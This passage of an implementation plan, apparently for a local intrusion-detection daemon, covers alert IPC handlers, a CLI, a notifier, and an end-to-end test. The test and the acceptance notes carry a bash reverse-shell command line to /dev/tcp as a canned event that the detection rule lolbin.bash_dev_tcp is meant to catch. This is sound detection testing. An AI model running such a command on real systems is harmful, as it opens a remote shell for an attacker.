ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
```

Expected: 7 new tests (2 sink + 5 worker) pass; total 245.

- [ ] **Step 6: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-rules-10-notifier
git add inspectord/workers/notifier/ inspectord/supervisor.py inspectord/config.py \
        tests/test_notifier_desktop_sink.py tests/test_notifier_worker.py
git commit -m "feat(notifier): desktop sink + severity routing + supervisor wiring"
git push -u origin task-rules-10-notifier
gh pr create --base main --head task-rules-10-notifier \
  --title "feat(notifier): desktop popup sink" \
  --body "DesktopSink shells out to notify-send with severity → urgency mapping. NotifierWorker.on_alert(alert) routes to sinks based on the spec §9.4 default matrix (critical/high/medium → desktop; low/info silent). Supervisor wires NotifierWorker into attach_alert_listener when notifier_desktop_enabled=True (defaults to False in dev_config so tests don't pop notifications)."
```

Wait for CI green; do NOT merge.

---

## Task 11: Alerts IPC methods + alerts CLI

**Files:**
- Create: `inspectord/alerts/ipc_handlers.py`
- Create: `inspectorctl/cli/alerts.py`
- Modify: `inspectord/__main__.py` (register new methods)
- Modify: `inspectorctl/cli/app.py` (mount the alerts subapp)
- Create: `tests/test_ipc_alerts.py`
- Create: `tests/test_cli_alerts.py`

**Branch:** `task-rules-11-alerts-ipc-cli`

IPC: `list_alerts`, `get_alert`, `ack_alert`, `resolve_alert`, `suppress_alert`. CLI: `inspectorctl alerts list/show/ack/resolve/suppress`.

- [ ] **Step 1: Failing tests**

Write `tests/test_ipc_alerts.py`:

```python
"""Tests for the alerts IPC handlers."""

from __future__ import annotations

import json
from datetime import UTC, datetime
from pathlib import Path

import pytest

from inspectord.alerts.ipc_handlers import (
    handle_ack_alert,
    handle_get_alert,
    handle_list_alerts,
    handle_resolve_alert,
    handle_suppress_alert,
)
from inspectord.alerts.lifecycle import InvalidTransitionError
from inspectord.storage.db import Database
from inspectord.storage.migrations import run_migrations


def _seed_alert(db_path: Path, *, alert_id: str = "01900000-0000-7000-8000-000000000001",
                rule_id: str = "lolbin.bash_dev_tcp",
                severity: str = "critical", status: str = "new") -> None:
    now = datetime.now(UTC)
    payload = {
        "schema_version": "1.0.0",
        "alert_id": alert_id,
        "rule": {
            "id": rule_id,
            "name": rule_id,
            "ruleset": "starter-pack",
            "version": "1.0.0",
            "severity": severity,
            "why": "",
            "false_positives": [],
        },
        "ts": now.isoformat(),
        "severity": severity,
        "status": status,
        "category": "intrusion_detection",
        "event_ids": ["e1"],
        "entities": [{"kind": "process", "key": "pid:1234"}],
        "dedup_key": f"{rule_id}:pid:1234",
        "dedup_count": 1,
        "first_seen_at": now.isoformat(),
        "last_seen_at": now.isoformat(),
        "rendered": {"short": "short", "detail": "detail"},
        "notes": [],
        "labels": [],
    }
    with Database(db_path) as db:
        run_migrations(db)
        db.execute(
            "INSERT INTO alerts (alert_id, rule_id, ts, severity, status, category, dedup_key, "
            "dedup_count, first_seen_at, last_seen_at, rendered_short, rendered_detail, payload_json) "
            "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
            [alert_id, rule_id, now, severity, status, "intrusion_detection",
             f"{rule_id}:pid:1234", 1, now, now, "short", "detail", json.dumps(payload)],
        )


def test_list_alerts_returns_seeded_rows(tmp_path: Path) -> None:
    db_path = tmp_path / "t.duckdb"
    _seed_alert(db_path)
    result = handle_list_alerts(params={"limit": 10}, db_path=db_path)
    assert len(result["alerts"]) == 1
    assert result["alerts"][0]["rule_id"] == "lolbin.bash_dev_tcp"


def test_list_alerts_filters_by_status(tmp_path: Path) -> None:
    db_path = tmp_path / "t.duckdb"
    _seed_alert(db_path, alert_id="a1", status="new")
    _seed_alert(db_path, alert_id="a2", status="resolved")
    result = handle_list_alerts(params={"status": "new"}, db_path=db_path)
    ids = [a["alert_id"] for a in result["alerts"]]
    assert ids == ["a1"]


def test_get_alert_returns_full_payload(tmp_path: Path) -> None:
    db_path = tmp_path / "t.duckdb"
    _seed_alert(db_path, alert_id="a1")
    result = handle_get_alert(params={"alert_id": "a1"}, db_path=db_path)
    assert result["alert"]["alert_id"] == "a1"
    assert result["alert"]["rule"]["id"] == "lolbin.bash_dev_tcp"


def test_get_alert_missing_returns_none(tmp_path: Path) -> None:
    db_path = tmp_path / "t.duckdb"
    with Database(db_path) as db:
        run_migrations(db)
    result = handle_get_alert(params={"alert_id": "absent"}, db_path=db_path)
    assert result["alert"] is None


def test_ack_alert_transitions_status(tmp_path: Path) -> None:
    db_path = tmp_path / "t.duckdb"
    _seed_alert(db_path, alert_id="a1")
    handle_ack_alert(params={"alert_id": "a1", "note": "looking"}, db_path=db_path)
    with Database(db_path) as db:
        row = db.query("SELECT status FROM alerts WHERE alert_id = ?", ["a1"]).fetchall()[0][0]
    assert row == "acknowledged"


def test_resolve_alert_from_new(tmp_path: Path) -> None:
    db_path = tmp_path / "t.duckdb"
    _seed_alert(db_path, alert_id="a1")
    handle_resolve_alert(params={"alert_id": "a1"}, db_path=db_path)
    with Database(db_path) as db:
        row = db.query("SELECT status FROM alerts WHERE alert_id = ?", ["a1"]).fetchall()[0][0]
    assert row == "resolved"


def test_suppress_alert(tmp_path: Path) -> None:
    db_path = tmp_path / "t.duckdb"
    _seed_alert(db_path, alert_id="a1")
    handle_suppress_alert(params={"alert_id": "a1"}, db_path=db_path)
    with Database(db_path) as db:
        row = db.query("SELECT status FROM alerts WHERE alert_id = ?", ["a1"]).fetchall()[0][0]
    assert row == "suppressed"


def test_invalid_transition_raises(tmp_path: Path) -> None:
    db_path = tmp_path / "t.duckdb"
    _seed_alert(db_path, alert_id="a1", status="resolved")
    with pytest.raises(InvalidTransitionError):
        handle_ack_alert(params={"alert_id": "a1"}, db_path=db_path)
```

Write `tests/test_cli_alerts.py`:

```python
"""Tests for inspectorctl alerts CLI."""

from __future__ import annotations

from pathlib import Path

from typer.testing import CliRunner

from inspectord.ipc_server import IpcServer, Method
from inspectorctl.cli.app import app


runner = CliRunner()


def test_alerts_list_renders(tmp_path: Path) -> None:
    sock_path = tmp_path / "ipc.sock"

    def handler(_params: dict[str, object]) -> dict[str, object]:
        return {
            "schema_version": "1.0.0",
            "alerts": [
                {
                    "alert_id": "a1",
                    "rule_id": "lolbin.bash_dev_tcp",
                    "ts": "2026-05-24T14:23:10+00:00",
                    "severity": "critical",
                    "status": "new",
                    "dedup_count": 1,
                    "rendered_short": "Reverse shell pid 1234",
                }
            ],
        }

    server = IpcServer(
        socket_path=sock_path,
        methods=[Method(name="list_alerts", handler=handler, mutates=False)],
        allowed_uids=[],
    )
    server.start()
    try:
        result = runner.invoke(app, ["alerts", "list", "--socket", str(sock_path)])
        assert result.exit_code == 0
        assert "lolbin.bash_dev_tcp" in result.stdout
    finally:
        server.stop()


def test_alerts_show_renders(tmp_path: Path) -> None:
    sock_path = tmp_path / "ipc.sock"

    def get_handler(_params: dict[str, object]) -> dict[str, object]:
        return {
            "schema_version": "1.0.0",
            "alert": {
                "alert_id": "a1",
                "rule": {"id": "lolbin.bash_dev_tcp", "name": "Reverse shell"},
                "severity": "critical",
                "status": "new",
                "rendered": {"short": "rs", "detail": "rs detail"},
            },
        }

    server = IpcServer(
        socket_path=sock_path,
        methods=[Method(name="get_alert", handler=get_handler, mutates=False)],
        allowed_uids=[],
    )
    server.start()
    try:
        result = runner.invoke(app, ["alerts", "show", "a1", "--socket", str(sock_path)])
        assert result.exit_code == 0
        assert "Reverse shell" in result.stdout
    finally:
        server.stop()
```

- [ ] **Step 2: Confirm failures**

```bash
cd /home/eli/Development/inspectord
source .venv/bin/activate
pytest tests/test_ipc_alerts.py tests/test_cli_alerts.py -v
```

Expected: ImportErrors.

- [ ] **Step 3: Implement IPC handlers**

Write `inspectord/alerts/ipc_handlers.py`:

```python
"""IPC handlers for alerts."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

from inspectord.alerts.lifecycle import validate_transition
from inspectord.schemas.alert import AlertStatus
from inspectord.storage.db import Database


def handle_list_alerts(*, params: dict[str, Any], db_path: Path) -> dict[str, Any]:
    status = params.get("status")
    severity = params.get("severity")
    limit = int(params.get("limit", 100))
    where = "WHERE 1=1"
    args: list[Any] = []
    if status:
        where += " AND status = ?"
        args.append(str(status))
    if severity:
        where += " AND severity = ?"
        args.append(str(severity))
    with Database(db_path) as db:
        rows = db.query(
            f"SELECT alert_id, rule_id, ts, severity, status, category, dedup_count, "
            f"rendered_short FROM alerts {where} ORDER BY ts DESC LIMIT ?",
            [*args, limit],
        ).fetchall()
    return {
        "schema_version": "1.0.0",
        "alerts": [
            {
                "alert_id": r[0],
                "rule_id": r[1],
                "ts": r[2].isoformat() if r[2] else None,
                "severity": r[3],
                "status": r[4],
                "category": r[5],
                "dedup_count": r[6],
                "rendered_short": r[7],
            }
            for r in rows
        ],
    }


def handle_get_alert(*, params: dict[str, Any], db_path: Path) -> dict[str, Any]:
    alert_id = str(params.get("alert_id", ""))
    with Database(db_path) as db:
        rows = db.query(
            "SELECT payload_json FROM alerts WHERE alert_id = ?", [alert_id]
        ).fetchall()
    if not rows:
        return {"schema_version": "1.0.0", "alert": None}
    return {"schema_version": "1.0.0", "alert": json.loads(rows[0][0])}


def _transition(db_path: Path, *, alert_id: str, target: AlertStatus) -> dict[str, Any]:
    with Database(db_path) as db:
        rows = db.query("SELECT status FROM alerts WHERE alert_id = ?", [alert_id]).fetchall()
        if not rows:
            return {"schema_version": "1.0.0", "ok": False, "error": "not found"}
        current = AlertStatus(rows[0][0])
        validate_transition(current, target)
        db.execute(
            "UPDATE alerts SET status = ? WHERE alert_id = ?",
            [target.value, alert_id],
        )
    return {"schema_version": "1.0.0", "ok": True, "status": target.value}


def handle_ack_alert(*, params: dict[str, Any], db_path: Path) -> dict[str, Any]:
    return _transition(db_path, alert_id=str(params.get("alert_id", "")), target=AlertStatus.acknowledged)


def handle_resolve_alert(*, params: dict[str, Any], db_path: Path) -> dict[str, Any]:
    return _transition(db_path, alert_id=str(params.get("alert_id", "")), target=AlertStatus.resolved)


def handle_suppress_alert(*, params: dict[str, Any], db_path: Path) -> dict[str, Any]:
    return _transition(db_path, alert_id=str(params.get("alert_id", "")), target=AlertStatus.suppressed)
```

- [ ] **Step 4: Register IPC methods in __main__.py**

In `inspectord/__main__.py`, inside `_ipc_methods(supervisor, cfg)`:

1. Add imports near the other dep_handler imports:

```python
    from inspectord.alerts.ipc_handlers import (
        handle_ack_alert,
        handle_get_alert,
        handle_list_alerts,
        handle_resolve_alert,
        handle_suppress_alert,
    )
```

2. Append five new `Method` entries to the returned list (after the existing entries):

```python
        Method(
            name="list_alerts",
            handler=lambda params: handle_list_alerts(params=params, db_path=cfg.storage.db_path),
            mutates=False,
        ),
        Method(
            name="get_alert",
            handler=lambda params: handle_get_alert(params=params, db_path=cfg.storage.db_path),
            mutates=False,
        ),
        Method(
            name="ack_alert",
            handler=lambda params: handle_ack_alert(params=params, db_path=cfg.storage.db_path),
            mutates=True,
        ),
        Method(
            name="resolve_alert",
            handler=lambda params: handle_resolve_alert(params=params, db_path=cfg.storage.db_path),
            mutates=True,
        ),
        Method(
            name="suppress_alert",
            handler=lambda params: handle_suppress_alert(params=params, db_path=cfg.storage.db_path),
            mutates=True,
        ),
```

- [ ] **Step 5: Implement CLI**

Write `inspectorctl/cli/alerts.py`:

```python
"""inspectorctl alerts subcommands."""

from __future__ import annotations

from pathlib import Path
from typing import Annotated

import typer
from rich import print as rprint
from rich.table import Table

from inspectorctl.ipc_client import IpcClient, IpcError


app = typer.Typer(no_args_is_help=True, add_completion=False, help="Alert triage commands.")


_DEFAULT_SOCKET = Path("var") / "inspectord.sock"


def _client(socket: Path) -> IpcClient:
    return IpcClient(socket_path=socket)


_SEVERITY_STYLE: dict[str, str] = {
    "critical": "[red]critical[/red]",
    "high": "[yellow]high[/yellow]",
    "medium": "[cyan]medium[/cyan]",
    "low": "[blue]low[/blue]",
    "info": "[dim]info[/dim]",
}


@app.command("list")
def list_cmd(
    socket: Annotated[Path, typer.Option("--socket", "-s")] = _DEFAULT_SOCKET,
    status: Annotated[str | None, typer.Option("--status")] = None,
    severity: Annotated[str | None, typer.Option("--severity")] = None,
    limit: Annotated[int, typer.Option("--limit")] = 50,
) -> None:
    """List alerts."""
    params: dict[str, object] = {"limit": limit}
    if status:
        params["status"] = status
    if severity:
        params["severity"] = severity
    try:
        result = _client(socket).call("list_alerts", params)
    except IpcError as exc:
        rprint(f"[red]ERROR[/red] {exc}")
        raise typer.Exit(code=1) from exc

    table = Table(title="Alerts")
    table.add_column("ID")
    table.add_column("Severity")
    table.add_column("Status")
    table.add_column("Rule")
    table.add_column("Dedup")
    table.add_column("Summary")
    for a in result.get("alerts", []):
        table.add_row(
            (a.get("alert_id") or "")[:8],
            _SEVERITY_STYLE.get(str(a.get("severity")), str(a.get("severity"))),
            str(a.get("status")),
            str(a.get("rule_id")),
            str(a.get("dedup_count", 1)),
            str(a.get("rendered_short", "")),
        )
    rprint(table)


@app.command("show")
def show_cmd(
    alert_id: str,
    socket: Annotated[Path, typer.Option("--socket", "-s")] = _DEFAULT_SOCKET,
) -> None:
    """Show full detail for one alert."""
    try:
        result = _client(socket).call("get_alert", {"alert_id": alert_id})
    except IpcError as exc:
        rprint(f"[red]ERROR[/red] {exc}")
        raise typer.Exit(code=1) from exc
    alert = result.get("alert")
    if alert is None:
        rprint(f"[red]not found[/red]: {alert_id}")
        raise typer.Exit(code=1)
    rprint(alert)


def _mutate(method: str, alert_id: str, socket: Path, *, note: str | None = None) -> None:
    params: dict[str, object] = {"alert_id": alert_id}
    if note:
        params["note"] = note
    try:
        result = _client(socket).call(method, params)
    except IpcError as exc:
        rprint(f"[red]ERROR[/red] {exc}")
        raise typer.Exit(code=1) from exc
    if not result.get("ok"):
        rprint(f"[red]FAIL[/red] {result.get('error', 'unknown')}")
        raise typer.Exit(code=1)
    rprint(f"[green]OK[/green] {alert_id} → {result['status']}")


@app.command("ack")
def ack_cmd(
    alert_id: str,
    note: Annotated[str | None, typer.Option("--note")] = None,
    socket: Annotated[Path, typer.Option("--socket", "-s")] = _DEFAULT_SOCKET,
) -> None:
    """Acknowledge an alert (new → acknowledged)."""
    _mutate("ack_alert", alert_id, socket, note=note)


@app.command("resolve")
def resolve_cmd(
    alert_id: str,
    note: Annotated[str | None, typer.Option("--note")] = None,
    socket: Annotated[Path, typer.Option("--socket", "-s")] = _DEFAULT_SOCKET,
) -> None:
    """Mark an alert resolved (terminal)."""
    _mutate("resolve_alert", alert_id, socket, note=note)


@app.command("suppress")
def suppress_cmd(
    alert_id: str,
    note: Annotated[str | None, typer.Option("--note")] = None,
    socket: Annotated[Path, typer.Option("--socket", "-s")] = _DEFAULT_SOCKET,
) -> None:
    """Mark an alert suppressed (terminal — implies the user added an allowlist entry)."""
    _mutate("suppress_alert", alert_id, socket, note=note)
```

- [ ] **Step 6: Mount the alerts subapp**

In `inspectorctl/cli/app.py`:

```python
"""Top-level Typer app for inspectorctl."""

from __future__ import annotations

import typer

from inspectorctl.cli import alerts, deps, events, self_test, status, version

app = typer.Typer(no_args_is_help=True, add_completion=False)
app.command(name="status")(status.cmd)
app.command(name="self-test")(self_test.cmd)
app.command(name="version")(version.cmd)
app.add_typer(deps.app, name="deps")
app.add_typer(events.app, name="events")
app.add_typer(alerts.app, name="alerts")
```

- [ ] **Step 7: Confirm pass + lint**

```bash
pytest tests/test_ipc_alerts.py tests/test_cli_alerts.py -v
pytest tests/ -v
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
```

Expected: 10 new tests pass; total 255.

- [ ] **Step 8: Commit + PR**

```bash
git checkout main && git pull origin main
git checkout -b task-rules-11-alerts-ipc-cli
git add inspectord/alerts/ipc_handlers.py inspectord/__main__.py \
        inspectorctl/cli/alerts.py inspectorctl/cli/app.py \
        tests/test_ipc_alerts.py tests/test_cli_alerts.py
git commit -m "feat(alerts): IPC methods + inspectorctl alerts CLI"
git push -u origin task-rules-11-alerts-ipc-cli
gh pr create --base main --head task-rules-11-alerts-ipc-cli \
  --title "feat(alerts): IPC + CLI" \
  --body "IPC methods: list_alerts (filterable by status/severity), get_alert (full payload), ack/resolve/suppress (with lifecycle-graph validation). CLI: inspectorctl alerts {list, show, ack, resolve, suppress}. State transitions enforce the spec §9.1 graph."
```

Wait for CI green; do NOT merge.

---

## Task 12: End-to-end integration test (rule fires → alert in DB → notifier called)

**Files:**
- Create: `tests/integration/test_alerts_e2e.py`

**Branch:** `task-rules-12-e2e`

Spawns a real `inspectord` daemon (via `--config <tmp toml>`), injects a synthetic event with a reverse-shell command line through the supervisor's test-only `_inject_for_test()` hook (we need an IPC method for this — see below), waits, then queries DuckDB for the alert.

Wait — the supervisor runs in a subprocess in this test; we can't call `_inject_for_test()` directly. We need a different test approach:

**Approach:** Add a synthetic worker `inspectord/workers/synthetic_emitter/__main__.py` that emits one canned reverse-shell event then exits. Wire it into the test's config. The supervisor processes it like any other event, the rule fires, alert lands in DB.

That's the cleanest path. Let me add it as part of this task.

**Files (revised):**
- Create: `inspectord/workers/synthetic_emitter/__init__.py`
- Create: `inspectord/workers/synthetic_emitter/__main__.py`
- Create: `tests/integration/test_alerts_e2e.py`

### Step 1: Synthetic emitter worker

Write `inspectord/workers/synthetic_emitter/__init__.py`:

```python
"""Synthetic-event emitter for integration testing."""
```

Write `inspectord/workers/synthetic_emitter/__main__.py`:

```python
"""Synthetic emitter worker — emits N canned events then exits.

Used by tests/integration/test_alerts_e2e.py to drive the rule_engine end-to-end
without needing a real process_collector. Reads two config keys:
  - events: list of literal Event dicts to emit
  - delay_s: how long to wait between emissions (default 0.1)
"""

from __future__ import annotations

import json
import time
from typing import Any

from inspectord.workers.contract import Worker, read_config_from_stdin


class SyntheticEmitterWorker(Worker):
    def step_interval_s(self) -> float:
        return 0.0

    def setup(self) -> None:
        self._events: list[dict[str, Any]] = list(self.config.get("events", []))
        self._delay = float(self.config.get("delay_s", 0.1))
        self._emitted = False

    def step(self) -> None:
        if self._emitted:
            self.request_stop()
            return
        for ev in self._events:
            self.emit_event(ev)
            time.sleep(self._delay)
        self._emitted = True


def main() -> None:
    cfg: dict[str, Any] = read_config_from_stdin()
    SyntheticEmitterWorker(name="synthetic_emitter", config=cfg).run()


if __name__ == "__main__":
    main()
```

### Step 2: Integration test

Write `tests/integration/test_alerts_e2e.py`:

```python
"""End-to-end: synthetic reverse-shell event → rule fires → alert in DuckDB."""

from __future__ import annotations

import json
import signal
import subprocess
import sys
import time
from datetime import UTC, datetime
from pathlib import Path

import pytest

from inspectord.ids import uuid7
from inspectord.storage.db import Database


@pytest.mark.integration
def test_reverse_shell_event_fires_alert(tmp_path: Path) -> None:
    var = tmp_path / "var"
    var.mkdir()

    # Build a canned reverse-shell event the synthetic emitter will produce.
    synth_event = {
        "schema_version": "1.0.0",
        "ts": datetime.now(UTC).isoformat(),
        "event_id": str(uuid7()),
        "kind": "event",
        "category": ["process"],
        "type": ["start"],
        "action": "process_start",
        "severity": "info",
        "module": "process_collector",
        "process": {
            "pid": 9999,
            "name": "bash",
            "command_line": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        },
        "labels": [],
    }

    config_path = tmp_path / "inspectord.toml"
    config_path.write_text(
        f"""
version = "1.0.0"

[storage]
db_path = "{var / 'inspectord.duckdb'}"
journal_dir = "{var / 'journal'}"

[ipc]
socket_path = "{var / 'inspectord.sock'}"
allowed_uids = []

[[workers]]
name = "synthetic_emitter"
module = "inspectord.workers.synthetic_emitter"

[workers.config]
events = [{json.dumps(synth_event)}]
delay_s = 0.1
""".strip()
    )

    proc = subprocess.Popen(
        [sys.executable, "-m", "inspectord", "--config", str(config_path)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    sock = var / "inspectord.sock"
    deadline = time.monotonic() + 10
    while time.monotonic() < deadline and not sock.exists():
        time.sleep(0.1)
    assert sock.exists(), "daemon never started"

    # Give the synthetic emitter time to push its event through the pipeline.
    time.sleep(2.0)

    proc.send_signal(signal.SIGTERM)
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        proc.kill()

    db_path = var / "inspectord.duckdb"
    deadline = time.monotonic() + 10
    found = False
    while time.monotonic() < deadline and not found:
        if db_path.exists():
            with Database(db_path) as db:
                rows = db.query(
                    "SELECT rule_id, severity FROM alerts WHERE rule_id = 'lolbin.bash_dev_tcp'"
                ).fetchall()
            if rows and rows[0][1] == "critical":
                found = True
                break
        time.sleep(0.2)
    assert found, "reverse-shell rule never produced an alert"
```

### Step 3: Run

```bash
cd /home/eli/Development/inspectord
source .venv/bin/activate
pytest -m integration tests/integration/test_alerts_e2e.py -v
pytest tests/ -v
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
```

Expected: 1 new integration test passes; total 256.

### Step 4: Branch + commit + push + PR

```bash
git checkout main && git pull origin main
git checkout -b task-rules-12-e2e
git add inspectord/workers/synthetic_emitter/ tests/integration/test_alerts_e2e.py
git commit -m "test(integration): rule fires + alert lands in DuckDB end-to-end"
git push -u origin task-rules-12-e2e
gh pr create --base main --head task-rules-12-e2e \
  --title "test(integration): reverse-shell e2e" \
  --body "Spins up inspectord with a synthetic_emitter worker that pushes one canned bash reverse-shell event. Asserts the LOLBin rule fires and an Alert lands in DuckDB with severity=critical."
```

Wait for CI green; do NOT merge.

---

## Task 13: Final sweep + spec bump to v0.2.3

**Files:**
- Modify: `docs/superpowers/specs/2026-05-24-local-inspection-design.md`

**Branch:** `task-rules-13-spec-bump`

- [ ] **Step 1: Verify the tree is green**

```bash
cd /home/eli/Development/inspectord
source .venv/bin/activate
git checkout main && git pull origin main
pytest tests/ -v
ruff check inspectord inspectorctl tests
ruff format --check inspectord inspectorctl tests
mypy inspectord inspectorctl
```

Expected: ~256 tests pass.

- [ ] **Step 2: Bump spec to v0.2.3**

In `docs/superpowers/specs/2026-05-24-local-inspection-design.md`:

Change the `Spec version` header line to `0.2.3` and append a new changelog row at the end of the changelog table:

```
| 0.2.3 | 2026-05-24 | Rule engine + allowlist + notifier landed. Starter rule pack: lolbin.bash_dev_tcp (Python), auth.ssh_brute_force (Python with 60s/5x window correlation), persistence.sudoers_modified (YAML), persistence.new_suid_file (YAML). File-based allowlist at /etc/inspectord/allowlist.yaml with scope evaluation (rule_id / entity / path_glob). DesktopSink via notify-send; Telegram/Signal still pending. IPC: list_alerts/get_alert/ack_alert/resolve_alert/suppress_alert. CLI: inspectorctl alerts {list, show, ack, resolve, suppress}. Sigma rule support still deferred. |
```

- [ ] **Step 3: Commit + PR**

```bash
git checkout -b task-rules-13-spec-bump
git add docs/superpowers/specs/2026-05-24-local-inspection-design.md \
        docs/superpowers/plans/2026-05-24-rule-engine-allowlist-notifier.md
git commit -m "docs(spec): bump to v0.2.3 — rule engine + allowlist + notifier landed"
git push -u origin task-rules-13-spec-bump
gh pr create --base main --head task-rules-13-spec-bump \
  --title "docs(spec): v0.2.3 + commit rule-engine plan" \
  --body "Marks the rule-engine + allowlist + notifier slice as implemented. Also commits the implementation plan."
```

---

## Acceptance criteria (this plan complete)

After Task 12 merges:

```bash
$ pytest tests/                     → ~256 passed
$ ruff / mypy                       → clean
$ inspectord --config <toml-with-notifier_desktop_enabled=true> &
# Trigger a synthetic event somehow (real process_collector lands later) — or just:
$ inspectorctl alerts list          → empty (no alerts yet)
# After running the e2e test, alerts table has the lolbin row.
```

When the real `process_collector` lands (next plan), running `bash -i >& /dev/tcp/...` on the host triggers a notify-send popup AND lands in `inspectorctl alerts list`. The CLI lets the user `ack`, `resolve`, or `suppress` (with optional `--note`).

## What this plan deliberately defers

- **Sigma rules** — pySigma compile-to-matcher is its own subsystem; YAML + Python plugins cover v1.
- **Incident auto-grouping** — alerts share dedup keys but don't yet roll up into Incidents. Comes with the dashboard.
- **Pending-actions menu** (§9.5) — alert proposes "kill process", "block IP", "add to allowlist with scope X" actions; needs IPC + UI. Polish plan.
- **Tuning suggestions** (§9.6) — needs accumulated rule-stats history.
- **Telegram + Signal sinks** — require libsecret-backed secret management (spec §18.4). Separate plan.
- **Web dashboard** — final Phase 1 plan.
- **Quiet hours, bundling, verbosity per sink** — UX polish that goes with the dashboard.

## Next plan after this one

`web_dashboard + entity context cards + alert triage UI` — wraps everything we've built so the user has a single pane of glass. Spec §2 (the 28-panel dashboard). After that lands, Phase 1 of the spec is complete.
